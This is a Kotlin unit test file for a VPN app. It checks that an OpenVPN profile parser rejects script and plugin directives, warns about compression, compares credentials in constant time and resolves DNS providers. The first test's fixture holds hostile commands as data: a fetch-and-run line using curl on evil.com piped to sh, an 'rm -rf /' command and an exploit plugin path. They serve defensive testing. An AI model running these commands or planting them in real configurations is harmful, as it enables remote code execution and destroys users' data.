package com.eliyardo.omnia.security

import com.eliyardo.omnia.profile.OvpnParser
import com.eliyardo.omnia.settings.AppSettings
import org.junit.Assert.*
import org.junit.Test
import java.security.MessageDigest

class SecurityPolicyTest {

    @Test
    fun testExecutableDirectivesAreRejected() {
        val parser = OvpnParser()
        val maliciousProfile = """
            client
            dev tun
            proto udp
            remote safe.vpn.org 1194
            up "/bin/sh -c 'curl evil.com/pwn | sh'"
            down "/bin/rm -rf /"
            plugin "/data/local/tmp/exploit.so"
            script-security 2
            <ca>
            -----BEGIN CERTIFICATE-----
            MIIB...
            -----END CERTIFICATE-----
            </ca>
        """.trimIndent()

        val result = parser.parse(maliciousProfile, "test.ovpn")

        // The parser must identify 'up', 'down', 'plugin', 'script-security' as unsupported
        assertTrue(result.unsupportedDirectives.contains("up"))
        assertTrue(result.unsupportedDirectives.contains("down"))
        assertTrue(result.unsupportedDirectives.contains("plugin"))
        assertTrue(result.unsupportedDirectives.contains("script-security"))
        assertTrue(result.warnings.any { it.contains("unsupported and will be ignored") })
    }

    @Test
    fun testCompressionProducesSecurityWarning() {
        val parser = OvpnParser()
        val compressionProfile = """
            client
            dev tun
            proto udp
            remote vpn.example.com 1194
            comp-lzo yes
            <ca>
            -----BEGIN CERTIFICATE-----
            MIIB...
            -----END CERTIFICATE-----
            </ca>
        """.trimIndent()

        val result = parser.parse(compressionProfile, "comp.ovpn")
        assertTrue("Compression should trigger a security warning (VORACLE)",
            result.warnings.any { it.contains("VORACLE", ignoreCase = true) })
    }

    @Test
    fun testConstantTimeCredentialComparison() {
        val secretPassword = "correct_horse_battery_staple"
        val wrongPassword = "correct_horse_battery_staplE"

        val match = MessageDigest.isEqual(
            secretPassword.toByteArray(Charsets.UTF_8),
            secretPassword.toByteArray(Charsets.UTF_8)
        )
        val mismatch = MessageDigest.isEqual(
            secretPassword.toByteArray(Charsets.UTF_8),
            wrongPassword.toByteArray(Charsets.UTF_8)
        )

        assertTrue("Identical passwords must match", match)
        assertFalse("Different passwords must not match", mismatch)
    }

    @Test
    fun testDnsResolveIpsForServerReturnsNull() {
        val result = AppSettings.resolveDnsIps(AppSettings.DNS_PROVIDER_SERVER, "", "")
        assertNull("Server DNS provider must return null to allow pushed server DNS", result)
    }

    @Test
    fun testDnsResolveIpsForPreconfiguredProviders() {
        val cloudflare = AppSettings.resolveDnsIps(AppSettings.DNS_PROVIDER_CLOUDFLARE, "", "")
        assertNotNull(cloudflare)
        assertEquals("1.1.1.1", cloudflare!!.first)
        assertEquals("1.0.0.1", cloudflare.second)

        val quad9 = AppSettings.resolveDnsIps(AppSettings.DNS_PROVIDER_QUAD9, "", "")
        assertNotNull(quad9)
        assertEquals("9.9.9.9", quad9!!.first)
        assertEquals("149.112.112.112", quad9.second)
    }
}
